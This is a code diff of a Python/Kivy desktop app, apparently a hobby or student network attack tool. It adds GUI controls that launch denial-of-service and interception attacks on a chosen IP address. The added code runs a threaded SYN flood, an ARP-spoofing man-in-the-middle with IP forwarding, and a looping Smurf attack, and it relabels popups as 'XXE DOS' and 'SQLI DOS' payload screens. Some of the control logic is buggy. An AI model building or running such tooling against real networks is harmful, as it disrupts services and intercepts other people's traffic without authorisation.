@@ -1,6 +1,6 @@
 from asyncio.base_futures import _FINISHED
-from asyncio.windows_events import NULL
 from threading import Thread
+import threading
 from time import sleep
 
 from kivy.clock import Clock
@@ -11,9 +11,13 @@ from kivy.core.window import Window
 from kivy.uix.floatlayout import FloatLayout
 from kivy.animation import Animation
 from kivy.uix.popup import Popup
+from zmq import NULL
+from modules.arp import ARPSpoofer, disable_ip_forwarding, enable_ip_forwarding
 
 
 import modules.auxilliary
+from modules.smurf_attack import smurf_packet
+from modules.syn_flood import syn_flood_packet
 
 
 class MyApp(App):
@@ -35,6 +39,7 @@ class FloatLayouts(FloatLayout):
 
 
 class P1(FloatLayout):
+    ATTACK_STOP = False
     Dane = modules.auxilliary.dane()
     c = NULL
     finished = True
@@ -59,15 +64,31 @@ class P1(FloatLayout):
         
     def spinner_clicked(self, value):
         print("Selected ip is " + value)
-        self.ids.ClickedConf1_port.disabled=False
-    
+        self.ids.button_atk.disabled = False
 
-    def ClickedConf1_port(self):
-        res = []
-        res = modules.auxilliary.scan_host_ports_multi_thread(self.ids.spinner_id_port.text)
-        print(res)
-        P1.finished = True
-        #TODO: FINISH
+
+    def spinner_clicked_atk(self, value):
+        print("Selected attack is " + value)
+        if (value == "SYN flood"):
+            print("Syn")
+        elif (value == "ARP spoof"):
+            print("ARP")
+        elif ("Smurf"):
+            print("Smurf")
+        else:
+            print("Nieznany atak")
+
+    
+    def ClickedConf1_atk(self):
+        if(self.ATTACK_STOP == False):
+            #Run attack
+            self.ids.button_atk.text = "Stop"
+        else:
+            #Stop attack
+            self.ids.button_atk.text = "Attack"
+            self.ATTACK_STOP = True
+
+
 
     def SearchForHosts(self):
         net_info = self.Dane.get_network_info()
@@ -76,7 +97,6 @@ class P1(FloatLayout):
         print(result)
         P1.finished = True
         print("[INFO] succesfully closed threads")
-        modules.auxilliary.dane.JOINED=False
         try:
             P1.c.join()
         except:
@@ -91,6 +111,46 @@ class P1(FloatLayout):
         else:
             self.ids.scan_button.text = "Scan"
 
+    def SynFlood(self, IP):
+        self.ids.Satus_label.text = "[b]Attack status: Scanning[/b]"
+        print("starting syn flood")
+        port = self.Dane.scan_host_ports_multi_thread_get_first(IP)
+        self.ids.Satus_label.text = "[b]Attack status: Attacking[/b]"
+        threads = []
+        while(self.ATTACK_STOP != True):
+            thread = threading.Thread(target = syn_flood_packet,args = [str(IP),port])
+            sleep(0.2)
+            thread.start()
+            threads.append(thread)
+        
+        print("ending syn flood")
+        for t in threads:
+            t.join()
+        self.ATTACK_STOP = False
+        print("syn flood closed all threads")
+    
+    def ARP(self, IP):
+        print("starting ARP")
+        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
+
+        #to nie będzie działać, trzeba przerobić funkcję tak by dało się ją wylączyć
+        enable_ip_forwarding()
+        spoofer = ARPSpoofer("Wlan 0", IP, self.Dane.HOSTS[0])
+        spoofer.mitm()
+        disable_ip_forwarding()
+        #koniec fragmentu do edycji
+
+        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
+        self.ATTACK_STOP = False
+    
+    def Smurf(self, IP):
+        print("starting Smurf")
+        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
+        while(self.ATTACK_STOP != True):
+            smurf_packet(IP)
+        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
+        self.ATTACK_STOP = False
+
       
         
         
@@ -100,10 +160,12 @@ class P1(FloatLayout):
 class P2(FloatLayout):
     def ClickedConf2(self):
         print("button on conf 2")
+        self.ids.XXE_ID.copy(data=self.ids.XXE_ID.text)
 
 class P3(FloatLayout):
     def ClickedConf3(self):
         print("button on conf 3")
+        self.ids.SQLI_ID.copy(data=self.ids.SQLI_ID.text)
 
 class P4(FloatLayout):
     def ClickedConf4(self):
@@ -117,13 +179,14 @@ def showPopUp1():
 
 def showPopUp2():
     show = P2()
-    popupWindow = Popup(title="App2", content=show, size_hint=(0.8,0.8) )
+    popupWindow = Popup(title="XXE DOS", content=show, size_hint=(0.8,0.8) )
     popupWindow.open()
 
 def showPopUp3():
     show = P3()
-    popupWindow = Popup(title="App3", content=show, size_hint=(0.8,0.8) )
+    popupWindow = Popup(title="SQLI DOS", content=show, size_hint=(0.8,0.8) )
     popupWindow.open()
+    
 
 def showPopUp4():
     show = P4()
